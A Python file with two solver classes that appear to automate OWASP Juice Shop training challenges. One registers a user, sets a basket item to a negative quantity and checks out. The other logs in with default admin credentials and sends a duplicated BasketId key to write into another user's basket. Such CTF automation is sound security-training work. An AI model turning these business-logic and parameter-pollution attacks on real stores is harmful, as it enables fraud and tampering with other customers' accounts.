from core.base_solver import BaseSolver
from loguru import logger
import json
import random

class PaybackTimeSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "negativeOrderChallenge"

    def solve(self) -> bool:
        # Register a new user to ensure a fresh basket
        email = f"payback_{random.randint(1000, 9999)}@test.com"
        reg_payload = {
            "email": email,
            "password": "password123",
            "passwordRepeat": "password123",
            "securityQuestion": {"id": 1, "answer": "answer"}
        }
        self.client.post("/api/Users", json=reg_payload)
        
        # Login
        login_res = self.client.post("/rest/user/login", json={"email": email, "password": "password123"})
        auth = login_res.json().get("authentication", {})
        token = auth.get("token")
        if not token: return False
        headers = {"Authorization": f"Bearer {token}"}
        
        # Get basket ID from login response (bid)
        basket_id = auth.get("bid")
        
        # If bid is missing, try to fetch from API
        if not basket_id:
            user_id = self.client.get("/rest/user/whoami", headers=headers).json().get("user", {}).get("id")
            if user_id:
                basket_res = self.client.get(f"/rest/basket/{user_id}", headers=headers)
                basket_id = basket_res.json().get("data", {}).get("id")
        
        if not basket_id:
             logger.error("Could not determine Basket ID")
             return False

        # 3. Add item to basket
        # Payload: {"ProductId": 1, "BasketId": "...", "quantity": 1}
        # If basket_id is None, this might fail.
        # Let's hope the GET created it or returned it.
        add_payload = {"ProductId": 1, "BasketId": str(basket_id), "quantity": 1}
        res = self.client.post("/api/BasketItems", json=add_payload, headers=headers)
        item_id = res.json().get("data", {}).get("id")
        
        if not item_id: 
            logger.error("Failed to add item to basket")
            return False
        
        # 4. Update with negative quality
        update_payload = {"quantity": -1000}
        self.client.put(f"/api/BasketItems/{item_id}", json=update_payload, headers=headers)
        
        # 5. Checkout
        # Create address
        address_payload = {
            "country": "US",
            "fullName": "Payback User",
            "mobileNum": 1234567890,
            "zipCode": "12345",
            "streetAddress": "123 Payback St",
            "city": "Payback City",
            "state": "Payback State"
        }
        addr_res = self.client.post("/api/Addresss", json=address_payload, headers=headers)
        addr_id = addr_res.json().get("data", {}).get("id")
        
        # Get Delivery Method
        del_res = self.client.get("/api/Deliverys", headers=headers)
        del_id = del_res.json().get("data", [{}])[0].get("id")
        
        # Get Payment (Card)
        card_payload = {
            "fullName": "Payback User",
            "cardNum": "1111222233334444",
            "expMonth": "12",
            "expYear": "2080"
        }
        card_res = self.client.post("/api/Cards", json=card_payload, headers=headers)
        card_id = card_res.json().get("data", {}).get("id")
        
        if addr_id and del_id and card_id and basket_id:
            checkout_payload = {
                "paymentId": card_id,
                "addressId": addr_id,
                "deliveryMethodId": del_id
            }
            self.client.post(f"/rest/basket/{basket_id}/checkout", json=checkout_payload, headers=headers)
            
        return True

class BasketManipulateSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "basketManipulateChallenge"

    def solve(self) -> bool:
        # 1. Login
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        if not token: return False
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. HPP to add to another basket
        # Note: BasketId must exist. Basket 1 or 2 usually exists.
        payload = '{"ProductId":1,"BasketId":"1","quantity":1,"BasketId":"2"}'
        res = self.client.post("/api/BasketItems", data=payload, headers={**headers, "Content-Type": "application/json"})
        return res.status_code == 201
